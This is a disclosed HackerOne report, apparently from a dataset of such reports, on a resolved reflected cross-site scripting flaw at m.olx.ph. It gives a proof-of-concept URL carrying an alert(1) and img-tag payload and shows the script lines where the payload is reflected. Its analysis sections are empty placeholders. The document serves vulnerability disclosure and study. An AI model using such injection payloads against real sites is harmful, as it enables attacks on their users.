---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '177230'
original_report_id: '177230'
title: Reflective XSS at m.olx.ph
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-10-21T07:05:16.237Z'
disclosed_at: '2016-10-28T07:30:42.055Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflective XSS at m.olx.ph

## Metadata

- HackerOne Report ID: 177230
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-10-28T07:30:42.055Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**URL**
https://m.olx.ph/mobile-phones-tablets/ph-'*alert(1)*'%3E%3Cimg%20src=x%3Easdf?q=qwerty

Injection happens on lines 769, 770 and repeated also at 1005, 1006
```
urlNoCategory = '/ph-'*alert(1)*'%3E%3Cimg%20src=x%3Easdf?q=qwerty';
urlNoLocation = '/mobile-phones-tablets/ph-'*alert(1)*'%3E%3Cimg%20src=x%3Easdf?q=qwerty';
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
